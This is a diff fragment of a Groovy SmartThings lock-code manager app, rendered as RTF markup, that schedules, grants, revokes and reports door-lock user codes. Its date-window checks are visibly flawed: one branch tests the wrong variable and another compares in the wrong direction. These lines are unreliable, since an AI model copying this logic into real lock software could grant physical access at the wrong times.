+    {\cf1\i // There's a start time, but no end time.  Allow access after start\par
+}    {\cf10\b if} {\cf8 (}dateStart{\cf8 .}{\cf21 getTime}{\cf8 (}{\cf8 )} {\cf8 >} now{\cf8 )} {\cf8 \{}\par
+      {\cf1\i // It's after the start time\par
+}      {\cf10\b return} {\cf10\b true}\par
+    {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+      {\cf1\i // It's before the start time\par
+}      {\cf10\b return} {\cf10\b false}\par
+    {\cf8 \}}\par
+\par
+  {\cf8 \}} {\cf10\b else} {\cf10\b if} {\cf8 (}dateEnd {\cf8 &}{\cf8 &} {\cf8 !}dateStart{\cf8 )} {\cf8 \{}\par
+    {\cf1\i // There's a end time, but no start time.  Allow access until end\par
+}    {\cf10\b if} {\cf8 (}dateStart{\cf8 .}{\cf21 getTime}{\cf8 (}{\cf8 )} {\cf8 >} now{\cf8 )} {\cf8 \{}\par
+      {\cf1\i // It's after the start time\par
+}      {\cf10\b return} {\cf10\b true}\par
+    {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+      {\cf1\i // It's before the start time\par
+}      {\cf10\b return} {\cf10\b false}\par
+    {\cf8 \}}\par
+\par
+  {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+    {\cf1\i // There's both an end time, and a start time.  Allow access between them.\par
+}    {\cf10\b if} {\cf8 (}dateStart{\cf8 .}{\cf21 getTime}{\cf8 (}{\cf8 )} {\cf8 <} now {\cf8 &}{\cf8 &} dateEnd{\cf8 .}{\cf21 getTime}{\cf8 (}{\cf8 )} {\cf8 >} now{\cf8 )} {\cf8 \{}\par
+      {\cf1\i // It's in calendar times\par
+}      {\cf10\b return} {\cf10\b true}\par
+    {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+      {\cf1\i // It's not in calendar times\par
+}      {\cf10\b return} {\cf10\b false}\par
+    {\cf8 \}}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 isCorrectMode}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  {\cf10\b if} {\cf8 (}modeStart{\cf8 )} {\cf8 \{}\par
+    {\cf1\i // mode check is on\par
+}    {\cf10\b if} {\cf8 (}location{\cf8 .}{\cf21 mode} {\cf8 =}{\cf8 =} modeStart{\cf8 )} {\cf8 \{}\par
+      {\cf1\i // we're in the right one mode\par
+}      {\cf10\b return} {\cf10\b true}\par
+    {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+      {\cf1\i // we're in the wrong mode\par
+}      {\cf10\b return} {\cf10\b false}\par
+    {\cf8 \}}\par
+  {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+    {\cf1\i // mode check is off\par
+}    {\cf10\b return} {\cf10\b false}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 isInScheduledTime}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  {\cf20 def} now {\cf8 =} {\cf10\b new} Date{\cf8 (}{\cf8 )}\par
+  {\cf10\b if} {\cf8 (}startTime {\cf8 &}{\cf8 &} endTime{\cf8 )} {\cf8 \{}\par
+    {\cf20 def} start {\cf8 =} timeToday{\cf8 (}startTime{\cf8 )}\par
+    {\cf20 def} stop {\cf8 =} timeToday{\cf8 (}endTime{\cf8 )}\par
+\par
+    {\cf1\i // there's both start time and end time\par
+}    {\cf10\b if} {\cf8 (}start{\cf8 .}{\cf21 before}{\cf8 (}now{\cf8 )} {\cf8 &}{\cf8 &} stop{\cf8 .}{\cf21 after}{\cf8 (}now{\cf8 )}{\cf8 )}{\cf8 \{}\par
+      {\cf1\i // It's between the times\par
+}      {\cf10\b return} {\cf10\b true}\par
+    {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+      {\cf1\i // It's not between the times\par
+}      {\cf10\b return} {\cf10\b false}\par
+    {\cf8 \}}\par
+  {\cf8 \}} {\cf10\b else} {\cf10\b if} {\cf8 (}startTime {\cf8 &}{\cf8 &} {\cf8 !}endTime{\cf8 )}{\cf8 \{}\par
+    {\cf1\i // there's a start time, but no end time\par
+}    {\cf20 def} start {\cf8 =} timeToday{\cf8 (}startTime{\cf8 )}\par
+    {\cf10\b if} {\cf8 (}start{\cf8 .}{\cf21 before}{\cf8 (}now{\cf8 )}{\cf8 )} {\cf8 \{}\par
+      {\cf1\i // it's after start time\par
+}      {\cf10\b return} {\cf10\b true}\par
+    {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+      {\cf1\i //it's before start time\par
+}      {\cf10\b return} {\cf10\b false}\par
+    {\cf8 \}}\par
+  {\cf8 \}} {\cf10\b else} {\cf10\b if} {\cf8 (}{\cf8 !}startTime {\cf8 &}{\cf8 &} endTime{\cf8 )} {\cf8 \{}\par
+    {\cf1\i // there's an end time but no start time\par
+}    {\cf20 def} stop {\cf8 =} timeToday{\cf8 (}endTime{\cf8 )}\par
+    {\cf10\b if} {\cf8 (}stop{\cf8 .}{\cf21 after}{\cf8 (}now{\cf8 )}{\cf8 )} {\cf8 \{}\par
+      {\cf1\i // it's still before end time\par
+}      {\cf10\b return} {\cf10\b true}\par
+    {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+      {\cf1\i // it's after end time\par
+}      {\cf10\b return} {\cf10\b false}\par
+    {\cf8 \}}\par
+  {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+    {\cf1\i // there are no times\par
+}    {\cf10\b return} {\cf10\b false}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 startDateTime}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  {\cf10\b if} {\cf8 (}startDay {\cf8 &}{\cf8 &} startMonth {\cf8 &}{\cf8 &} startYear {\cf8 &}{\cf8 &} startTime{\cf8 )} {\cf8 \{}\par
+    {\cf20 def} time {\cf8 =} {\cf10\b new} Date{\cf8 (}{\cf8 )}{\cf8 .}{\cf21 parse}{\cf8 (}smartThingsDateFormat{\cf8 (}{\cf8 )}{\cf8 ,} startTime{\cf8 )}{\cf8 .}{\cf21 format}{\cf8 (}{\cf2 "'T'HH:mm:ss.SSSZ"}{\cf8 ,} timeZone{\cf8 (}startTime{\cf8 )}{\cf8 )}\par
+    {\cf10\b return} Date{\cf8 .}{\cf21 parse}{\cf8 (}{\cf2 "yyyy-MM-dd'T'HH:mm:ss.SSSZ"}{\cf8 ,} {\cf2 "$\{startYear\}-$\{startMonth\}-$\{startDay\}$\{time\}"}{\cf8 )}\par
+  {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+    {\cf1\i // Start Date Time not set\par
+}    {\cf10\b return} {\cf10\b false}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 endDateTime}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  {\cf10\b if} {\cf8 (}endDay {\cf8 &}{\cf8 &} endMonth {\cf8 &}{\cf8 &} endYear {\cf8 &}{\cf8 &} endTime{\cf8 )} {\cf8 \{}\par
+    {\cf20 def} time {\cf8 =} {\cf10\b new} Date{\cf8 (}{\cf8 )}{\cf8 .}{\cf21 parse}{\cf8 (}smartThingsDateFormat{\cf8 (}{\cf8 )}{\cf8 ,} endTime{\cf8 )}{\cf8 .}{\cf21 format}{\cf8 (}{\cf2 "'T'HH:mm:ss.SSSZ"}{\cf8 ,} timeZone{\cf8 (}endTime{\cf8 )}{\cf8 )}\par
+    {\cf10\b return} Date{\cf8 .}{\cf21 parse}{\cf8 (}{\cf2 "yyyy-MM-dd'T'HH:mm:ss.SSSZ"}{\cf8 ,} {\cf2 "$\{endYear\}-$\{endMonth\}-$\{endDay\}$\{time\}"}{\cf8 )}\par
+  {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+    {\cf1\i // End Date Time not set\par
+}    {\cf10\b return} {\cf10\b false}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 rightNow}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  {\cf20 def} now {\cf8 =} {\cf10\b new} Date{\cf8 (}{\cf8 )}{\cf8 .}{\cf21 format}{\cf8 (}{\cf2 "yyyy-MM-dd'T'HH:mm:ss.SSSZ"}{\cf8 ,} location{\cf8 .}{\cf21 timeZone}{\cf8 )}\par
+  {\cf10\b return} Date{\cf8 .}{\cf21 parse}{\cf8 (}{\cf2 "yyyy-MM-dd'T'HH:mm:ss.SSSZ"}{\cf8 ,} now{\cf8 )}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 isCorrectDay}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  {\cf20 def} today {\cf8 =} {\cf10\b new} Date{\cf8 (}{\cf8 )}{\cf8 .}{\cf21 format}{\cf8 (}{\cf2 "EEEE"}{\cf8 ,} location{\cf8 .}{\cf21 timeZone}{\cf8 )}\par
+  log{\cf8 .}{\cf21 debug} {\cf2 "today: $\{today\}, days: $\{days\}"}\par
+  {\cf10\b if} {\cf8 (}{\cf8 !}days {\cf8 |}{\cf8 |} days{\cf8 .}{\cf21 contains}{\cf8 (}today{\cf8 )}{\cf8 )} {\cf8 \{}\par
+    {\cf1\i // if no days, assume every day\par
+}    {\cf10\b return} {\cf10\b true}\par
+  {\cf8 \}}\par
+  log{\cf8 .}{\cf21 trace} {\cf2 "should not allow access - Not correct Day"}\par
+  {\cf10\b return} {\cf10\b false}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 userSlotArray}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  {\cf20 def} array {\cf8 =} {\cf8 [}{\cf8 ]}\par
+  {\cf10\b for} {\cf8 (}{\cf20 int} i {\cf8 =} {\cf8 1}{\cf8 ;} i {\cf8 <}{\cf8 =} settings{\cf8 .}{\cf21 maxUsers}{\cf8 ;} i{\cf8 +}{\cf8 +}{\cf8 )} {\cf8 \{}\par
+    {\cf10\b if} {\cf8 (}settings{\cf8 .}{\cf2 "userSlot$\{i\}"}{\cf8 )} {\cf8 \{}\par
+      array {\cf8 <}{\cf8 <} settings{\cf8 .}{\cf2 "userSlot$\{i\}"}{\cf8 .}{\cf21 toInteger}{\cf8 (}{\cf8 )}\par
+    {\cf8 \}}\par
+  {\cf8 \}}\par
+  {\cf10\b return} array\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 enabledUsersArray}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  {\cf20 def} array {\cf8 =} {\cf8 [}{\cf8 ]}\par
+  {\cf10\b for} {\cf8 (}{\cf20 int} i {\cf8 =} {\cf8 1}{\cf8 ;} i {\cf8 <}{\cf8 =} settings{\cf8 .}{\cf21 maxUsers}{\cf8 ;} i{\cf8 +}{\cf8 +}{\cf8 )} {\cf8 \{}\par
+    {\cf10\b if} {\cf8 (}userIsEnabled{\cf8 (}i{\cf8 )}{\cf8 )} {\cf8 \{}\par
+      array {\cf8 <}{\cf8 <} i\par
+    {\cf8 \}}\par
+  {\cf8 \}}\par
+  {\cf10\b return} array\par
+{\cf8 \}}\par
+{\cf20 def} {\cf5 enabledUsersSlotArray}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  {\cf20 def} array {\cf8 =} {\cf8 [}{\cf8 ]}\par
+  {\cf10\b for} {\cf8 (}{\cf20 int} i {\cf8 =} {\cf8 1}{\cf8 ;} i {\cf8 <}{\cf8 =} settings{\cf8 .}{\cf21 maxUsers}{\cf8 ;} i{\cf8 +}{\cf8 +}{\cf8 )} {\cf8 \{}\par
+    {\cf10\b if} {\cf8 (}userIsEnabled{\cf8 (}i{\cf8 )}{\cf8 )} {\cf8 \{}\par
+      {\cf20 def} userSlot {\cf8 =} settings{\cf8 .}{\cf2 "userSlot$\{i\}"}\par
+      array {\cf8 <}{\cf8 <} userSlot{\cf8 .}{\cf21 toInteger}{\cf8 (}{\cf8 )}\par
+    {\cf8 \}}\par
+  {\cf8 \}}\par
+  {\cf10\b return} array\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 disabledUsersSlotArray}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  {\cf20 def} array {\cf8 =} {\cf8 [}{\cf8 ]}\par
+  {\cf10\b for} {\cf8 (}{\cf20 int} i {\cf8 =} {\cf8 1}{\cf8 ;} i {\cf8 <}{\cf8 =} settings{\cf8 .}{\cf21 maxUsers}{\cf8 ;} i{\cf8 +}{\cf8 +}{\cf8 )} {\cf8 \{}\par
+    {\cf10\b if} {\cf8 (}{\cf8 !}userIsEnabled{\cf8 (}i{\cf8 )}{\cf8 )} {\cf8 \{}\par
+      {\cf10\b if} {\cf8 (}settings{\cf8 .}{\cf2 "userSlot$\{i\}"}{\cf8 )} {\cf8 \{}\par
+        array {\cf8 <}{\cf8 <} settings{\cf8 .}{\cf2 "userSlot$\{i\}"}{\cf8 .}{\cf21 toInteger}{\cf8 (}{\cf8 )}\par
+      {\cf8 \}}\par
+    {\cf8 \}}\par
+  {\cf8 \}}\par
+  {\cf10\b return} array\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 codereturn}{\cf8 (}evt{\cf8 )} {\cf8 \{}\par
+  {\cf20 def} codeNumber {\cf8 =} evt{\cf8 .}{\cf21 data}{\cf8 .}{\cf21 replaceAll}{\cf8 (}{\cf2 "\\\\D+"}{\cf8 ,}{\cf2 ""}{\cf8 )}\par
+  {\cf20 def} codeSlot {\cf8 =} evt{\cf8 .}{\cf21 value}\par
+  {\cf10\b if} {\cf8 (}notifyAccessEnd {\cf8 |}{\cf8 |} notifyAccessStart{\cf8 )} {\cf8 \{}\par
+    {\cf10\b if} {\cf8 (}userSlotArray{\cf8 (}{\cf8 )}{\cf8 .}{\cf21 contains}{\cf8 (}evt{\cf8 .}{\cf21 integerValue}{\cf8 .}{\cf21 toInteger}{\cf8 (}{\cf8 )}{\cf8 )}{\cf8 )} {\cf8 \{}\par
+      {\cf20 def} userName {\cf8 =} settings{\cf8 .}{\cf2 "userName$\{usedUserIndex(evt.integerValue)\}"}\par
+      {\cf10\b if} {\cf8 (}codeNumber {\cf8 =}{\cf8 =} {\cf2 ""}{\cf8 )} {\cf8 \{}\par
+        {\cf10\b if} {\cf8 (}notifyAccessEnd{\cf8 )} {\cf8 \{}\par
+          {\cf20 def} message {\cf8 =} {\cf2 "$\{userName\} no longer has access to $\{evt.displayName\}"}\par
+          {\cf10\b if} {\cf8 (}codeNumber{\cf8 .}{\cf21 isNumber}{\cf8 (}{\cf8 )}{\cf8 )} {\cf8 \{}\par
+            state{\cf8 .}{\cf2 "lock$\{evt.deviceId\}"}{\cf8 .}{\cf21 codes}{\cf8 .}{\cf2 "slot$\{codeSlot\}"} {\cf8 =} codeNumber\par
+          {\cf8 \}}\par
+          send{\cf8 (}message{\cf8 )}\par
+        {\cf8 \}}\par
+      {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+        {\cf10\b if} {\cf8 (}notifyAccessStart{\cf8 )} {\cf8 \{}\par
+          {\cf20 def} message {\cf8 =} {\cf2 "$\{userName\} now has access to $\{evt.displayName\}"}\par
+          {\cf10\b if} {\cf8 (}codeNumber{\cf8 .}{\cf21 isNumber}{\cf8 (}{\cf8 )}{\cf8 )} {\cf8 \{}\par
+            state{\cf8 .}{\cf2 "lock$\{evt.deviceId\}"}{\cf8 .}{\cf21 codes}{\cf8 .}{\cf2 "slot$\{codeSlot\}"} {\cf8 =} codeNumber\par
+          {\cf8 \}}\par
+          send{\cf8 (}message{\cf8 )}\par
+        {\cf8 \}}\par
+      {\cf8 \}}\par
+    {\cf8 \}}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 usedUserIndex}{\cf8 (}usedSlot{\cf8 )} {\cf8 \{}\par
+  {\cf10\b for} {\cf8 (}{\cf20 int} i {\cf8 =} {\cf8 1}{\cf8 ;} i {\cf8 <}{\cf8 =} settings{\cf8 .}{\cf21 maxUsers}{\cf8 ;} i{\cf8 +}{\cf8 +}{\cf8 )} {\cf8 \{}\par
+    {\cf10\b if} {\cf8 (}settings{\cf8 .}{\cf2 "userSlot$\{i\}"} {\cf8 &}{\cf8 &} settings{\cf8 .}{\cf2 "userSlot$\{i\}"}{\cf8 .}{\cf21 toInteger}{\cf8 (}{\cf8 )} {\cf8 =}{\cf8 =} usedSlot{\cf8 .}{\cf21 toInteger}{\cf8 (}{\cf8 )}{\cf8 )} {\cf8 \{}\par
+      {\cf10\b return} i\par
+    {\cf8 \}}\par
+  {\cf8 \}}\par
+  {\cf10\b return} {\cf10\b false}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 codeUsed}{\cf8 (}evt{\cf8 )} {\cf8 \{}\par
+  {\cf1\i // check the status of the lock, helpful for some schlage locks.\par
+}  runIn{\cf8 (}{\cf8 10}{\cf8 ,} doPoll{\cf8 )}\par
+  log{\cf8 .}{\cf21 debug}{\cf8 (}{\cf2 "codeUsed evt.value: "} {\cf8 +} evt{\cf8 .}{\cf21 value} {\cf8 +} {\cf2 ". evt.data: "} {\cf8 +} evt{\cf8 .}{\cf21 data}{\cf8 )}\par
+  {\cf20 def} message {\cf8 =} {\cf10\b null}\par
+\par
+  {\cf10\b if}{\cf8 (}evt{\cf8 .}{\cf21 value} {\cf8 =}{\cf8 =} {\cf2 "unlocked"} {\cf8 &}{\cf8 &} evt{\cf8 .}{\cf21 data}{\cf8 )} {\cf8 \{}\par
+    {\cf20 def} codeData {\cf8 =} {\cf10\b new} JsonSlurper{\cf8 (}{\cf8 )}{\cf8 .}{\cf21 parseText}{\cf8 (}evt{\cf8 .}{\cf21 data}{\cf8 )}\par
+    {\cf10\b if}{\cf8 (}codeData{\cf8 .}{\cf21 usedCode} {\cf8 &}{\cf8 &} codeData{\cf8 .}{\cf21 usedCode}{\cf8 .}{\cf21 isNumber}{\cf8 (}{\cf8 )} {\cf8 &}{\cf8 &} userSlotArray{\cf8 (}{\cf8 )}{\cf8 .}{\cf21 contains}{\cf8 (}codeData{\cf8 .}{\cf21 usedCode}{\cf8 .}{\cf21 toInteger}{\cf8 (}{\cf8 )}{\cf8 )}{\cf8 )} {\cf8 \{}\par
+      {\cf20 def} usedIndex {\cf8 =} usedUserIndex{\cf8 (}codeData{\cf8 .}{\cf21 usedCode}{\cf8 )}{\cf8 .}{\cf21 toInteger}{\cf8 (}{\cf8 )}\par
+      {\cf20 def} unlockUserName {\cf8 =} settings{\cf8 .}{\cf2 "userName$\{usedIndex\}"}\par
+      message {\cf8 =} {\cf2 "$\{evt.displayName\} was unlocked by $\{unlockUserName\}"}\par
+      {\cf1\i // increment usage\par
+}      state{\cf8 .}{\cf2 "userState$\{usedIndex\}"}{\cf8 .}{\cf21 usage} {\cf8 =} state{\cf8 .}{\cf2 "userState$\{usedIndex\}"}{\cf8 .}{\cf21 usage} {\cf8 +} {\cf8 1}\par
+      {\cf10\b if}{\cf8 (}settings{\cf8 .}{\cf2 "userHomePhrases$\{usedIndex\}"}{\cf8 )} {\cf8 \{}\par
+        {\cf1\i // Specific User Hello Home\par
+}        {\cf10\b if} {\cf8 (}settings{\cf8 .}{\cf2 "userNoRunPresence$\{usedIndex\}"} {\cf8 &}{\cf8 &} settings{\cf8 .}{\cf2 "userDoRunPresence$\{usedIndex\}"} {\cf8 =}{\cf8 =} {\cf10\b null}{\cf8 )} {\cf8 \{}\par
+          {\cf10\b if} {\cf8 (}{\cf8 !}anyoneHome{\cf8 (}settings{\cf8 .}{\cf2 "userNoRunPresence$\{usedIndex\}"}{\cf8 )}{\cf8 )} {\cf8 \{}\par
+            location{\cf8 .}{\cf21 helloHome}{\cf8 .}{\cf21 execute}{\cf8 (}settings{\cf8 .}{\cf2 "userHomePhrases$\{usedIndex\}"}{\cf8 )}\par
+          {\cf8 \}}\par
+        {\cf8 \}} {\cf10\b else} {\cf10\b if} {\cf8 (}settings{\cf8 .}{\cf2 "userDoRunPresence$\{usedIndex\}"} {\cf8 &}{\cf8 &} settings{\cf8 .}{\cf2 "userNoRunPresence$\{usedIndex\}"} {\cf8 =}{\cf8 =} {\cf10\b null}{\cf8 )} {\cf8 \{}\par
+          {\cf10\b if} {\cf8 (}anyoneHome{\cf8 (}settings{\cf8 .}{\cf2 "userDoRunPresence$\{usedIndex\}"}{\cf8 )}{\cf8 )} {\cf8 \{}\par
+            location{\cf8 .}{\cf21 helloHome}{\cf8 .}{\cf21 execute}{\cf8 (}settings{\cf8 .}{\cf2 "userHomePhrases$\{usedIndex\}"}{\cf8 )}\par
+          {\cf8 \}}\par
+        {\cf8 \}} {\cf10\b else} {\cf10\b if} {\cf8 (}settings{\cf8 .}{\cf2 "userDoRunPresence$\{usedIndex\}"} {\cf8 &}{\cf8 &} settings{\cf8 .}{\cf2 "userNoRunPresence$\{usedIndex\}"}{\cf8 )} {\cf8 \{}\par
+          {\cf10\b if} {\cf8 (}anyoneHome{\cf8 (}settings{\cf8 .}{\cf2 "userDoRunPresence$\{usedIndex\}"}{\cf8 )} {\cf8 &}{\cf8 &} {\cf8 !}anyoneHome{\cf8 (}settings{\cf8 .}{\cf2 "userNoRunPresence$\{usedIndex\}"}{\cf8 )}{\cf8 )} {\cf8 \{}\par
+            location{\cf8 .}{\cf21 helloHome}{\cf8 .}{\cf21 execute}{\cf8 (}settings{\cf8 .}{\cf2 "userHomePhrases$\{usedIndex\}"}{\cf8 )}\par
+          {\cf8 \}}\par
+        {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+          location{\cf8 .}{\cf21 helloHome}{\cf8 .}{\cf21 execute}{\cf8 (}settings{\cf8 .}{\cf2 "userHomePhrases$\{usedIndex\}"}{\cf8 )}\par
+        {\cf8 \}}\par
+      {\cf8 \}}\par
+      {\cf10\b if}{\cf8 (}settings{\cf8 .}{\cf2 "burnCode$\{usedIndex\}"}{\cf8 )} {\cf8 \{}\par
+        theLocks{\cf8 .}{\cf21 deleteCode}{\cf8 (}codeData{\cf8 .}{\cf21 usedCode}{\cf8 )}\par
+        runIn{\cf8 (}{\cf8 60}{\cf8 *}{\cf8 2}{\cf8 ,} doPoll{\cf8 )}\par
+        message {\cf8 +}{\cf8 =} {\cf2 ".  Now burning code."}\par
+      {\cf8 \}}\par
+      {\cf1\i //Don't send notification if muted\par
+}      {\cf10\b if}{\cf8 (}settings{\cf8 .}{\cf2 "dontNotify$\{usedIndex\}"} {\cf8 =}{\cf8 =} {\cf10\b true}{\cf8 )} {\cf8 \{}\par
+        message {\cf8 =} {\cf10\b null}\par
+      {\cf8 \}}\par
+    {\cf8 \}}\par
+  {\cf8 \}} {\cf10\b else} {\cf10\b if}{\cf8 (}evt{\cf8 .}{\cf21 value} {\cf8 =}{\cf8 =} {\cf2 "unlocked"} {\cf8 &}{\cf8 &} settings{\cf8 .}{\cf21 notifyUnlock}{\cf8 )} {\cf8 \{}\par
+    message {\cf8 =} {\cf2 "$\{evt.displayName\} has been manually unlocked"}\par
+  {\cf8 \}} {\cf10\b else} {\cf10\b if}{\cf8 (}evt{\cf8 .}{\cf21 value} {\cf8 =}{\cf8 =} {\cf2 "locked"} {\cf8 &}{\cf8 &} settings{\cf8 .}{\cf21 notifyLock}{\cf8 )} {\cf8 \{}\par
+    message {\cf8 =} {\cf2 "$\{evt.displayName\} has been locked"}\par
+  {\cf8 \}}\par
+\par
+  {\cf10\b if} {\cf8 (}message{\cf8 )} {\cf8 \{}\par
+    log{\cf8 .}{\cf21 debug}{\cf8 (}{\cf2 "Sending message: "} {\cf8 +} message{\cf8 )}\par
+    send{\cf8 (}message{\cf8 )}\par
+  {\cf8 \}}\par
+\par
+  {\cf10\b if} {\cf8 (}homePhrases{\cf8 )} {\cf8 \{}\par
+    performActions{\cf8 (}evt{\cf8 )}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+{\cf1\i //*******\par
+}{\cf1\i //check the code and shows the helloHome\par
+}{\cf20 def} {\cf5 performActions}{\cf8 (}evt{\cf8 )} {\cf8 \{}\par
+  {\cf10\b if}{\cf8 (}evt{\cf8 .}{\cf21 value} {\cf8 =}{\cf8 =} {\cf2 "unlocked"} {\cf8 &}{\cf8 &} evt{\cf8 .}{\cf21 data}{\cf8 )} {\cf8 \{}\par
+    {\cf20 def} codeData {\cf8 =} {\cf10\b new} JsonSlurper{\cf8 (}{\cf8 )}{\cf8 .}{\cf21 parseText}{\cf8 (}evt{\cf8 .}{\cf21 data}{\cf8 )}\par
+    {\cf10\b if}{\cf8 (}enabledUsersArray{\cf8 (}{\cf8 )}{\cf8 .}{\cf21 contains}{\cf8 (}codeData{\cf8 .}{\cf21 usedCode}{\cf8 )} {\cf8 |}{\cf8 |} isManualUnlock{\cf8 (}codeData{\cf8 )}{\cf8 )} {\cf8 \{}\par
+      {\cf1\i // Global Hello Home\par
+}      {\cf10\b if}{\cf8 (}location{\cf8 .}{\cf21 currentMode} {\cf8 !}{\cf8 =} modeIgnore{\cf8 )} {\cf8 \{}\par
+        {\cf10\b if} {\cf8 (}noRunPresence {\cf8 &}{\cf8 &} doRunPresence {\cf8 =}{\cf8 =} {\cf10\b null}{\cf8 )} {\cf8 \{}\par
+          {\cf10\b if} {\cf8 (}{\cf8 !}anyoneHome{\cf8 (}noRunPresence{\cf8 )}{\cf8 )} {\cf8 \{}\par
+            location{\cf8 .}{\cf21 helloHome}{\cf8 .}{\cf21 execute}{\cf8 (}homePhrases{\cf8 )}\par
+          {\cf8 \}}\par
+        {\cf8 \}} {\cf10\b else} {\cf10\b if} {\cf8 (}doRunPresence {\cf8 &}{\cf8 &} noRunPresence {\cf8 =}{\cf8 =} {\cf10\b null}{\cf8 )} {\cf8 \{}\par
+          {\cf10\b if} {\cf8 (}anyoneHome{\cf8 (}doRunPresence{\cf8 )}{\cf8 )} {\cf8 \{}\par
+            location{\cf8 .}{\cf21 helloHome}{\cf8 .}{\cf21 execute}{\cf8 (}homePhrases{\cf8 )}\par
+          {\cf8 \}}\par
+        {\cf8 \}} {\cf10\b else} {\cf10\b if} {\cf8 (}doRunPresence {\cf8 &}{\cf8 &} noRunPresence{\cf8 )} {\cf8 \{}\par
+          {\cf10\b if} {\cf8 (}anyoneHome{\cf8 (}doRunPresence{\cf8 )} {\cf8 &}{\cf8 &} {\cf8 !}anyoneHome{\cf8 (}noRunPresence{\cf8 )}{\cf8 )} {\cf8 \{}\par
+            location{\cf8 .}{\cf21 helloHome}{\cf8 .}{\cf21 execute}{\cf8 (}homePhrases{\cf8 )}\par
+          {\cf8 \}}\par
+        {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+         location{\cf8 .}{\cf21 helloHome}{\cf8 .}{\cf21 execute}{\cf8 (}homePhrases{\cf8 )}\par
+        {\cf8 \}}\par
+      {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+        {\cf20 def} routineMessage {\cf8 =} {\cf2 "Already in $\{modeIgnore\} mode, skipping execution of $\{homePhrases\} routine."}\par
+        log{\cf8 .}{\cf21 debug} routineMessage\par
+        {\cf5 send}{\cf8 (}routineMessage{\cf8 )}\par
+      {\cf8 \}}\par
+    {\cf8 \}}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 revokeDisabledUsers}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  {\cf20 def} array {\cf8 =} {\cf8 [}{\cf8 ]}\par
+  disabledUsersSlotArray{\cf8 (}{\cf8 )}{\cf8 .}{\cf21 each} {\cf8 \{} slot {\cf8 -}{\cf8 >}\par
+    array {\cf8 <}{\cf8 <} {\cf8 [}{\cf2 "code$\{slot\}"}{\cf8 ,} {\cf2 ""}{\cf8 ]}\par
+  {\cf8 \}}\par
+  {\cf20 def} json {\cf8 =} {\cf10\b new} groovy{\cf8 .}{\cf21 json}{\cf8 .}{\cf21 JsonBuilder}{\cf8 (}array{\cf8 )}{\cf8 .}{\cf21 toString}{\cf8 (}{\cf8 )}\par
+  {\cf10\b if} {\cf8 (}json {\cf8 !}{\cf8 =} {\cf2 '[]'}{\cf8 )} {\cf8 \{}\par
+    theLocks{\cf8 .}{\cf21 updateCodes}{\cf8 (}json{\cf8 )}\par
+    runIn{\cf8 (}{\cf8 60}{\cf8 *}{\cf8 2}{\cf8 ,} doPoll{\cf8 )}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 doPoll}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  {\cf1\i // this gets codes if custom device is installed\par
+}  {\cf10\b if} {\cf8 (}{\cf8 !}allCodesDone{\cf8 (}{\cf8 )}{\cf8 )} {\cf8 \{}\par
+    state{\cf8 .}{\cf21 error_loop_count} {\cf8 =} state{\cf8 .}{\cf21 error_loop_count} {\cf8 +} {\cf8 1}\par
+  {\cf8 \}}\par
+  theLocks{\cf8 .}{\cf21 poll}{\cf8 (}{\cf8 )}\par
+{\cf8 \}}\par
+{\cf1\i ////////*************cool!!!!!\par
+}{\cf20 def} {\cf5 grantAccess}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  {\cf20 def} array {\cf8 =} {\cf8 [}{\cf8 ]}\par
+  enabledUsersArray{\cf8 (}{\cf8 )}{\cf8 .}{\cf21 each} {\cf8 \{} user{\cf8 -}{\cf8 >}\par
+    {\cf20 def} userSlot {\cf8 =} settings{\cf8 .}{\cf2 "userSlot$\{user\}"}\par
+    {\cf10\b if} {\cf8 (}settings{\cf8 .}{\cf2 "userCode$\{user\}"} {\cf8 !}{\cf8 =} {\cf10\b null}{\cf8 )} {\cf8 \{}\par
+      {\cf20 def} newCode {\cf8 =} settings{\cf8 .}{\cf2 "userCode$\{user\}"}\par
+      array {\cf8 <}{\cf8 <} {\cf8 [}{\cf2 "code$\{userSlot\}"}{\cf8 ,} {\cf2 "$\{newCode\}"}{\cf8 ]}\par
